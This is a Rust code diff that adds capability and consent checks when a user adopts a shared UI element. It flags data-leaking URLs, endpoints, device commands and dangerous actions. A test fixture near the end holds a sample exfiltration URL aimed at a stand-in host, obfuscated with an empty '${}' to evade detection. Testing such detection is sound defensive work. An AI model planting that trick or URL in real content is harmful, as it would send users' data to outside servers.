@@ -463,24 +463,75 @@ fn bare_expr(s: &str) -> bool {
     })
 }
 
+/// `s` with every `${…}` that names no field (`${}`, which draws as
+/// nothing) taken out: what a URL put together around one says
+/// (`http${}s://…` is `https://…`, decision `adoption-capabilities`).
+fn without_empty_exprs(s: &str) -> String {
+    let mut out = String::new();
+    let mut rest = s;
+    while let Some(i) = rest.find("${") {
+        out.push_str(&rest[..i]);
+        let after = &rest[i..];
+        match after.find('}') {
+            Some(e) if !after[..e].contains('#') => rest = &after[e + 1..],
+            Some(e) => {
+                out.push_str(&after[..=e]);
+                rest = &after[e + 1..];
+            }
+            None => {
+                out.push_str(after);
+                rest = "";
+            }
+        }
+    }
+    out.push_str(rest);
+    out
+}
+
+/// Whether `s` names a host, once empty expressions are taken out.
+fn names_host(s: &str) -> bool {
+    let n = without_empty_exprs(s).to_ascii_lowercase();
+    n.contains("http://") || n.contains("https://") || n.trim_start().starts_with("//")
+}
+
 /// A URL that sends what it reads to whoever serves it: a fixed host
 /// with an expression that reads data, or a URL put together from one.
 fn data_url(key: Option<&str>, s: &str) -> bool {
-    reads_data(s)
-        && (s.contains("http://")
-            || s.contains("https://")
-            || (key.is_some_and(url_key) && !bare_expr(s)))
+    reads_data(s) && (names_host(s) || (key.is_some_and(url_key) && !bare_expr(s)))
+}
+
+/// The flags of `v` (an element, or a materialized node) as `publish` and
+/// `adopt` list them.
+pub(crate) fn flags_of(v: &Value, element: &str, out: &mut Vec<Value>) {
+    flags_in(v, element, "", None, out);
 }
 
 fn flags_in(v: &Value, element: &str, at: &str, key: Option<&str>, out: &mut Vec<Value>) {
+    flags_at(v, element, at, key, false, out);
+}
+
+/// [`flags_in`]; `payload`: inside an action's payload, where every
+/// literal string is what the action sends.
+fn flags_at(
+    v: &Value,
+    element: &str,
+    at: &str,
+    key: Option<&str>,
+    payload: bool,
+    out: &mut Vec<Value>,
+) {
     match v {
         Value::String(s) => {
             if data_url(key, s) {
                 let mut f = flag("url", element, at, s);
                 f["reads_data"] = json!(true);
                 out.push(f);
-            } else if s.contains("http://") || s.contains("https://") {
+            } else if names_host(s) {
                 out.push(flag("url", element, at, s));
+            } else if payload {
+                if literal_text(s).chars().any(char::is_alphanumeric) {
+                    out.push(flag("payload", element, at, s));
+                }
             } else if key.is_some_and(|k| TEXT_KEYS.contains(&k)) {
                 let t = literal_text(s);
                 if t.chars().any(char::is_alphanumeric) {
@@ -490,15 +541,41 @@ fn flags_in(v: &Value, element: &str, at: &str, key: Option<&str>, out: &mut Vec
         }
         Value::Array(a) => {
             for (i, c) in a.iter().enumerate() {
-                flags_in(c, element, &format!("{at}/{i}"), key, out);
+                flags_at(c, element, &format!("{at}/{i}"), key, payload, out);
             }
         }
         Value::Object(o) => {
+            // An action: every endpoint it calls and device command it runs
+            // (decision `adoption-capabilities`).
+            let tag = o.get("intent").and_then(Value::as_str);
+            if let Some(tag) = tag {
+                for k in ["endpoint", "path"] {
+                    if let Some(e) = o.get(k).and_then(Value::as_str) {
+                        out.push(flag("endpoint", element, &format!("{at}/{k}"), e));
+                    }
+                }
+                if tag == "action.device"
+                    && let Some(c) = o.get("command").and_then(Value::as_str)
+                {
+                    out.push(flag("device", element, &format!("{at}/command"), c));
+                }
+            }
             for (k, c) in o {
                 if k == "type" || k == "ref" || k == "icon" || k == "intent" {
                     continue;
                 }
-                flags_in(c, element, &format!("{at}/{}", escape(k)), Some(k), out);
+                if tag.is_some() && matches!(k.as_str(), "endpoint" | "path" | "command") {
+                    continue;
+                }
+                let inner = payload || (tag.is_some() && k == "payload");
+                flags_at(
+                    c,
+                    element,
+                    &format!("{at}/{}", escape(k)),
+                    Some(k),
+                    inner,
+                    out,
+                );
             }
         }
         _ => {}
@@ -917,6 +994,16 @@ fn ensure_tables(conn: &Connection) -> rusqlite::Result<()> {
     if !has {
         conn.execute_batch("ALTER TABLE adoptions ADD COLUMN accepted TEXT NOT NULL DEFAULT '[]'")?;
     }
+    // Added for decision `adoption-capabilities`: what the adoption may
+    // reach (`{feeds, elements, accepted_actions}`; `{}` before it).
+    let has: bool = conn
+        .prepare("SELECT 1 FROM pragma_table_info('adoptions') WHERE name = 'capabilities'")?
+        .exists([])?;
+    if !has {
+        conn.execute_batch(
+            "ALTER TABLE adoptions ADD COLUMN capabilities TEXT NOT NULL DEFAULT '{}'",
+        )?;
+    }
     Ok(())
 }
 
@@ -930,19 +1017,72 @@ struct Adoption {
     bind: Map<String, Value>,
     adopted_at: i64,
     /// The URLs that send what they read which the user accepted
-    /// (`accept_data_urls`): a new version bringing others waits for them.
+    /// (`accept_data_urls`), each keyed by the URL, its element, its
+    /// pointer and that element's bindings (decision
+    /// `adoption-capabilities`; plain URLs recorded before that match
+    /// nothing): a new version bringing others waits for them.
     accepted: BTreeSet<String>,
+    /// What it may reach (decision `adoption-capabilities`).
+    caps: Caps,
+}
+
+/// What an adoption may reach, recorded when it is adopted or updated.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+struct Caps {
+    /// The feeds its bindings name: all the data it loads.
+    #[serde(default)]
+    feeds: Vec<(String, String)>,
+    /// The elements it draws (empty: adopted before this was recorded).
+    #[serde(default)]
+    elements: BTreeSet<String>,
+    /// What the adopter accepted it may reach outside its bind
+    /// (`accept_actions`).
+    #[serde(default)]
+    accepted_actions: BTreeSet<String>,
+}
+
+/// An adoption's reach, for serving its elements' data
+/// ([`super::adopted::scope_of`]).
+pub(crate) struct AdoptionScope {
+    pub name: String,
+    pub bind: Map<String, Value>,
+    pub feeds: Vec<(String, String)>,
+    pub elements: BTreeSet<String>,
+    pub accepted_actions: BTreeSet<String>,
+}
+
+/// Every adoption's reach (none when the table isn't there).
+pub(crate) fn adoption_scopes(conn: &Connection) -> Vec<AdoptionScope> {
+    let has: bool = conn
+        .prepare("SELECT 1 FROM sqlite_master WHERE type = 'table' AND name = 'adoptions'")
+        .and_then(|mut s| s.exists([]))
+        .unwrap_or(false);
+    if !has {
+        return Vec::new();
+    }
+    adoptions(conn)
+        .unwrap_or_default()
+        .into_iter()
+        .map(|a| AdoptionScope {
+            name: a.name,
+            bind: a.bind,
+            feeds: a.caps.feeds,
+            elements: a.caps.elements,
+            accepted_actions: a.caps.accepted_actions,
+        })
+        .collect()
 }
 
 fn adoption(conn: &Connection, name: &str) -> rusqlite::Result<Option<Adoption>> {
     ensure_tables(conn)?;
     conn.query_row(
-        "SELECT name, link, publication, version, mode, bind, adopted_at, accepted FROM adoptions \
-         WHERE name = ?1",
+        "SELECT name, link, publication, version, mode, bind, adopted_at, accepted, capabilities \
+         FROM adoptions WHERE name = ?1",
         [name],
         |r| {
             let bind: String = r.get(5)?;
             let accepted: String = r.get(7)?;
+            let caps: String = r.get(8)?;
             Ok(Adoption {
                 name: r.get(0)?,
                 link: r.get(1)?,
@@ -952,6 +1092,7 @@ fn adoption(conn: &Connection, name: &str) -> rusqlite::Result<Option<Adoption>>
                 bind: serde_json::from_str(&bind).unwrap_or_default(),
                 adopted_at: r.get(6)?,
                 accepted: serde_json::from_str(&accepted).unwrap_or_default(),
+                caps: serde_json::from_str(&caps).unwrap_or_default(),
             })
         },
     )
@@ -979,10 +1120,10 @@ fn save_adoption(conn: &Connection, a: &Adoption) -> rusqlite::Result<()> {
     let now = crate::util::now_secs();
     conn.execute(
         "INSERT INTO adoptions (name, link, publication, version, mode, bind, adopted_at, updated_at,
-             accepted)
-         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9)
+             accepted, capabilities)
+         VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10)
          ON CONFLICT(name) DO UPDATE SET link = ?2, publication = ?3, version = ?4, mode = ?5,
-             bind = ?6, updated_at = ?8, accepted = ?9",
+             bind = ?6, updated_at = ?8, accepted = ?9, capabilities = ?10",
         params![
             a.name,
             a.link,
@@ -992,7 +1133,8 @@ fn save_adoption(conn: &Connection, a: &Adoption) -> rusqlite::Result<()> {
             Value::Object(a.bind.clone()).to_string(),
             a.adopted_at,
             now,
-            json!(a.accepted).to_string()
+            json!(a.accepted).to_string(),
+            serde_json::to_string(&a.caps).unwrap_or_else(|_| "{}".into())
         ],
     )?;
     Ok(())
@@ -1021,6 +1163,10 @@ pub fn tool_specs() -> Vec<Value> {
     let accept_data_urls = json!({ "type": "array", "items": { "type": "string" },
         "description": "URLs (exactly as the sends_data refusal lists them) that the user agreed \
         may send their data to another server when drawn" });
+    let accept_actions = json!({ "type": "array", "items": { "type": "string" },
+        "description": "Accept values (exactly as the needs_acceptance refusal lists them: an \
+        endpoint, device:<command>, reads:<source>) the user agreed the shared element may reach \
+        outside its bindings: starting agent runs, plugging jacks, deleting, signing out" });
     vec![
         spec(
             "set_handle",
@@ -1088,13 +1234,18 @@ pub fn tool_specs() -> Vec<Value> {
              the user's own to change, no updates). Every answer lists flags: each literal text \
              and URL the publication carries; show them to the user. A URL that puts the user's \
              data into a request (reads_data: an image URL with $item.… or $in.…) is refused \
-             (sends_data) unless the user agrees and you pass it in accept_data_urls.",
+             (sends_data) unless the user agrees and you pass it in accept_data_urls. An \
+             adopted element reaches only the data it is bound to: data of another collection \
+             is refused (reaches_unbound), and actions outside its bindings or of a dangerous \
+             class (agent runs, jacks, sign-ins, deletes, leaving the pod) are refused \
+             (needs_acceptance) unless the user agrees and you pass them in accept_actions.",
             json!({
                 "link": link,
                 "bindings": bindings,
                 "mode": { "type": "string", "enum": ["follow", "pin", "fork"] },
                 "dry_run": { "type": "boolean" },
                 "accept_data_urls": accept_data_urls.clone(),
+                "accept_actions": accept_actions.clone(),
             }),
             &["link"],
         ),
@@ -1114,10 +1265,12 @@ pub fn tool_specs() -> Vec<Value> {
              (pass it in bindings, and add it to the bind of each reference that uses it). A \
              version bringing a URL that puts the user's data into a request, which they haven't \
              accepted, is refused (sends_data) until they agree and you pass it in \
-             accept_data_urls. Answers the version's flags (its literal text and URLs).",
+             accept_data_urls; one reaching actions they haven't accepted waits the same way \
+             (needs_acceptance, accept_actions). Answers the version's flags (its literal text and URLs).",
             json!({ "name": { "type": "string", "description": "The adoption's name (@handle/slug)" },
                     "bindings": bindings,
-                    "accept_data_urls": accept_data_urls }),
+                    "accept_data_urls": accept_data_urls,
+                    "accept_actions": accept_actions }),
             &["name"],
         ),
         spec(
@@ -1514,25 +1667,77 @@ struct Fetched {
     flags: Vec<Value>,
 }
 
-impl Fetched {
-    /// The URLs that send what they read (`reads_data`), each once.
-    fn data_urls(&self) -> BTreeSet<String> {
-        self.flags
-            .iter()
-            .filter(|f| f["reads_data"] == true)
-            .filter_map(|f| f["value"].as_str().map(str::to_owned))
-            .collect()
-    }
-}
-
-/// The URLs the caller accepts (`accept_data_urls`).
-fn accepted_arg(args: &Value) -> BTreeSet<String> {
-    args["accept_data_urls"]
+/// The strings the caller passes in `key` (`accept_data_urls`,
+/// `accept_actions`).
+fn strings_arg(args: &Value, key: &str) -> BTreeSet<String> {
+    args[key]
         .as_array()
         .into_iter()
         .flatten()
         .filter_map(|v| v.as_str().map(str::to_owned))
         .collect()
+}
+
+/// What a publication bound with `bind` over `feeds` reaches (decision
+/// `adoption-capabilities`). Blocking; takes the store's connection.
+fn reach_check(
+    pod: &Pod,
+    f: &Fetched,
+    bind: &Map<String, Value>,
+    feeds: &[(String, String)],
+) -> Result<super::adopted::Checked, Value> {
+    pod.store().with_conn(|conn| {
+        let objects = ConnObjects::new(conn);
+        for (id, v, _) in &f.objects {
+            objects
+                .extra
+                .borrow_mut()
+                .insert(id.clone(), Arc::new(v.clone()));
+        }
+        super::adopted::check(
+            pod,
+            &objects,
+            &f.publication.name,
+            &f.publication.root,
+            bind,
+            feeds,
+            f.publication.interface["kind"] == "component",
+        )
+    })
+}
+
+/// Consent a bound publication still waits for: what it can't reach at
+/// all, what it reaches outside its bind that `actions` doesn't accept,
+/// and the URLs sending data whose keys `urls` doesn't hold.
+fn consent(
+    name: &str,
+    c: &super::adopted::Checked,
+    actions: &BTreeSet<String>,
+    urls: &BTreeSet<String>,
+) -> Result<(), Value> {
+    if let Some(r) = c.refusal(name) {
+        return Err(r);
+    }
+    let unaccepted = c.unaccepted(actions);
+    if !unaccepted.is_empty() {
+        return Err(super::adopted::needs_refusal(name, &unaccepted));
+    }
+    let urls = c.unaccepted_urls(urls);
+    if !urls.is_empty() {
+        let mut r = data_urls_refusal(name, &urls);
+        r["data_url_flags"] = crate::mcp::untrusted(
+            name,
+            json!(
+                c.data_urls
+                    .iter()
+                    .filter(|(_, f)| f["value"].as_str().is_some_and(|v| urls.contains(v)))
+                    .map(|(_, f)| f.clone())
+                    .collect::<Vec<_>>()
+            ),
+        );
+        return Err(r);
+    }
+    Ok(())
 }
 
 /// The refusal of URLs that read the adopter's data and weren't accepted.
@@ -1775,8 +1980,8 @@ fn plan(pod: &Pod, conn: &Connection, inputs: &[Value], bindings: &Map<String, V
 }
 
 /// The materialized root of a publication bound with `bind`, checked as a
-/// layout over the adopter's home feeds and `feeds`: the sources' own
-/// checks (fields a collection has) run too. Blocking; takes the store's
+/// layout over the pod's sources, and the sources' own checks (fields a
+/// collection has) over the adopter's home feeds and `feeds`. Blocking; takes the store's
 /// connection itself, so call it holding none.
 fn check_bound(
     pod: &Pod,
@@ -1808,13 +2013,16 @@ fn check_bound(
                 layout doesn't fit them", "check": { "detail": e.to_string(), "at": e.pointer,
                 "allowed": e.allowed } })
         };
-        let sources = crate::layouts::feed_sources(pod, &all);
+        // What it may reach is the adoption check's (decision
+        // `adoption-capabilities`): here, that it fits the pod's sources.
+        let every: Vec<_> = pod.catalog().sources().collect();
         crate::validate::custom_layout(
             m.node["id"].as_str().unwrap_or("c-adopting"),
             &m.node,
-            &sources,
+            &every,
         )
         .map_err(misfit)?;
+        let sources = crate::layouts::feed_sources(pod, &all);
         for (name, _) in &sources {
             let Some((adapter, _)) = pod.catalog().source(name) else {
                 continue;
@@ -1882,8 +2090,6 @@ async fn adopt(pod: &Pod, args: &Value) -> Result<Value, Value> {
             "flags": crate::mcp::untrusted(&fetched.publication.name, json!(fetched.flags)),
         })
     };
-    let accept = accepted_arg(args);
-    let unaccepted: BTreeSet<String> = fetched.data_urls().difference(&accept).cloned().collect();
     if !plan.problems.is_empty() {
         let mut r = report(false);
         r["error"] = json!("not_ready");
@@ -1892,13 +2098,45 @@ async fn adopt(pod: &Pod, args: &Value) -> Result<Value, Value> {
         );
         return Err(r);
     }
-    if !unaccepted.is_empty() {
+    // What it reaches, bound so (decision `adoption-capabilities`).
+    let accept_actions = strings_arg(args, "accept_actions");
+    let accept_urls = strings_arg(args, "accept_data_urls");
+    let (p, f2, b, fe) = (
+        pod.clone(),
+        Arc::new(fetched),
+        plan.bind.clone(),
+        plan.feeds.clone(),
+    );
+    let fetched_arc = f2.clone();
+    let checked = tokio::task::spawn_blocking(move || reach_check(&p, &f2, &b, &fe))
+        .await
+        .map_err(|e| refuse("internal", e.to_string()))??;
+    let Ok(fetched) = Arc::try_unwrap(fetched_arc) else {
+        return Err(refuse("internal", "the publication is still in use"));
+    };
+    let report = |ready: bool| {
+        let mut r = json!({
+            "ready": ready,
+            "name": fetched.publication.name,
+            "version": fetched.publication.version,
+            "interface": crate::mcp::untrusted(&fetched.publication.name, fetched.publication.interface.clone()),
+            "bind": plan.bind,
+            "create": plan.create.iter().map(|(t, a)| json!({"tool": t, "args": a})).collect::<Vec<_>>(),
+            "problems": plan.problems,
+            "proposed": plan.proposed,
+            "flags": crate::mcp::untrusted(&fetched.publication.name, json!(fetched.flags)),
+        });
+        r["accepted_actions"] = json!(checked.needed());
+        r
+    };
+    if let Err(e) = consent(
+        &fetched.publication.name,
+        &checked,
+        &accept_actions,
+        &checked.url_keys(&accept_urls),
+    ) {
         let mut r = report(false);
-        for (k, v) in data_urls_refusal(&fetched.publication.name, &unaccepted)
-            .as_object()
-            .into_iter()
-            .flatten()
-        {
+        for (k, v) in e.as_object().into_iter().flatten() {
             r[k] = v.clone();
         }
         return Err(r);
@@ -1939,9 +2177,17 @@ async fn adopt(pod: &Pod, args: &Value) -> Result<Value, Value> {
     tokio::task::spawn_blocking(move || check_bound(&p, &f2, &pl.bind, &pl.feeds))
         .await
         .map_err(|e| refuse("internal", e.to_string()))??;
+    let reach = Arc::new(Reached {
+        caps: Caps {
+            feeds: plan.feeds.clone(),
+            elements: checked.elements.clone(),
+            accepted_actions: checked.needed(),
+        },
+        urls: checked.data_urls.iter().map(|(k, _)| k.clone()).collect(),
+    });
     let args = json!({ "fetched": true });
     super::write::run_write(pod, &args, move |pod, conn, _| {
-        store_adoption(pod, conn, &fetched, &plan, &mode, &link)
+        store_adoption(pod, conn, &fetched, &plan, &reach, &mode, &link)
     })
     .await
 }
@@ -1954,11 +2200,19 @@ fn put_objects(conn: &Connection, f: &Fetched) -> Result<(), Value> {
     Ok(())
 }
 
+/// What an adoption was checked to reach, recorded with it.
+struct Reached {
+    caps: Caps,
+    /// The keys of the data URLs accepted.
+    urls: BTreeSet<String>,
+}
+
 fn store_adoption(
     pod: &Pod,
     conn: &Connection,
     f: &Fetched,
     plan: &Plan,
+    reach: &Reached,
     mode: &str,
     link: &str,
 ) -> Result<(Value, Vec<(String, i64)>), Value> {
@@ -2002,7 +2256,8 @@ fn store_adoption(
                 mode: mode.to_owned(),
                 bind: plan.bind.clone(),
                 adopted_at: crate::util::now_secs(),
-                accepted: f.data_urls(),
+                accepted: reach.urls.clone(),
+                caps: reach.caps.clone(),
             },
         )
         .map_err(store_err)?;
@@ -2018,6 +2273,7 @@ fn store_adoption(
         "bind": plan.bind,
         "needs": p.interface["needs"].clone(),
         "flags": f.flags,
+        "accepted_actions": reach.caps.accepted_actions,
         "detail": "Put \"use\" (embedded) or \"open\" (a link, on a button's on_click) in home with \
             update_layout, then look at it with render_layout_preview. If needs lists jacks, check \
             them with list_jacks.",
@@ -2064,20 +2320,43 @@ async fn update_adoption(pod: &Pod, args: &Value) -> Result<Value, Value> {
     let (p, a) = (pod.clone(), args.clone());
     let step = tokio::task::spawn_blocking(move || {
         let step = p.store().with_conn(|c| update_check(&p, c, &a))?;
-        if let Update::Go(b) = &step {
-            check_bound(&p, &b.1, &b.2.bind, &b.2.feeds)?;
+        let Update::Go(b) = step else {
+            return Ok::<_, Value>((step, None));
+        };
+        let (ad, f, plan) = &*b;
+        // What the new version reaches, bound so: the dangerous and
+        // outside-the-bind actions the user accepted carry over, and URLs
+        // sending data carry over only where they were (decision
+        // `adoption-capabilities`).
+        let checked = reach_check(&p, f, &plan.bind, &plan.feeds)?;
+        let actions = &ad.caps.accepted_actions | &strings_arg(&a, "accept_actions");
+        let urls = &ad.accepted | &checked.url_keys(&strings_arg(&a, "accept_data_urls"));
+        if let Err(mut e) = consent(&f.publication.name, &checked, &actions, &urls) {
+            e["version"] = json!(f.publication.version);
+            e["flags"] = crate::mcp::untrusted(&f.publication.name, json!(f.flags));
+            return Err(e);
         }
-        Ok::<_, Value>(step)
+        check_bound(&p, f, &plan.bind, &plan.feeds)?;
+        let reach = Reached {
+            caps: Caps {
+                feeds: plan.feeds.clone(),
+                elements: checked.elements.clone(),
+                accepted_actions: checked.needed(),
+            },
+            urls: checked.data_urls.iter().map(|(k, _)| k.clone()).collect(),
+        };
+        Ok((Update::Go(b), Some(reach)))
     })
     .await
     .map_err(|e| refuse("internal", e.to_string()))??;
-    let found = match step {
-        Update::Done(v) => return Ok(v),
-        Update::Go(b) => Arc::new(*b),
+    let (found, reach) = match step {
+        (Update::Done(v), _) => return Ok(v),
+        (Update::Go(b), Some(r)) => (Arc::new(*b), Arc::new(r)),
+        (Update::Go(_), None) => return Err(refuse("internal", "unchecked update")),
     };
     super::write::run_write(pod, args, move |pod, conn, _| {
         let (a, f, plan) = &*found;
-        update_store(pod, conn, a.clone(), f, plan)
+        update_store(pod, conn, a.clone(), f, plan, &reach)
     })
     .await
 }
@@ -2114,15 +2393,6 @@ fn update_check(pod: &Pod, conn: &Connection, args: &Value) -> Result<Update, Va
         return Ok(Update::Done(
             json!({ "ok": true, "name": name, "version": a.version, "up_to_date": true }),
         ));
-    }
-    // A URL sending the user's data that they haven't accepted waits for them.
-    let accept = &a.accepted | &accepted_arg(args);
-    let unaccepted: BTreeSet<String> = f.data_urls().difference(&accept).cloned().collect();
-    if !unaccepted.is_empty() {
-        let mut r = data_urls_refusal(&f.publication.name, &unaccepted);
-        r["version"] = json!(f.publication.version);
-        r["flags"] = crate::mcp::untrusted(&f.publication.name, json!(f.flags));
-        return Err(r);
     }
     // The saved bindings, as adopt's arguments, with any new ones on top.
     let mut bindings = Map::new();
@@ -2225,6 +2495,7 @@ fn update_store(
     mut a: Adoption,
     f: &Fetched,
     plan: &Plan,
+    reach: &Reached,
 ) -> Result<(Value, Vec<(String, i64)>), Value> {
     let name = a.name.clone();
     put_objects(conn, f)?;
@@ -2252,13 +2523,15 @@ fn update_store(
     }
     a.version = f.publication.version;
     a.bind = plan.bind.clone();
-    a.accepted = f.data_urls();
+    a.accepted = reach.urls.clone();
+    a.caps = reach.caps.clone();
     save_adoption(conn, &a).map_err(store_err)?;
     cstore::bump_generation(conn).map_err(store_err)?;
     cstore::collect_garbage(conn).map_err(store_err)?;
     Ok((
         json!({ "ok": true, "name": name, "version": a.version, "el": f.publication.root,
-                "bind": plan.bind, "flags": f.flags }),
+                "bind": plan.bind, "flags": f.flags,
+                "accepted_actions": reach.caps.accepted_actions }),
         moved,
     ))
 }
@@ -2338,6 +2611,9 @@ mod tests {
             ("label", "see https://a.example/$in.who", true),
             ("url", "$arg.host$item.notes", true),
             ("src", "$in.base/p.png", true),
+            // Put together around an empty expression, under any key
+            // (decision `adoption-capabilities`).
+            ("link", "http${}s://evil.example/p.png?d=$item.title", true),
             ("url", "$item.photo", false),
             ("url", "${books://b/1#photo}", false),
             ("url", "https://a.example/logo.png", false),
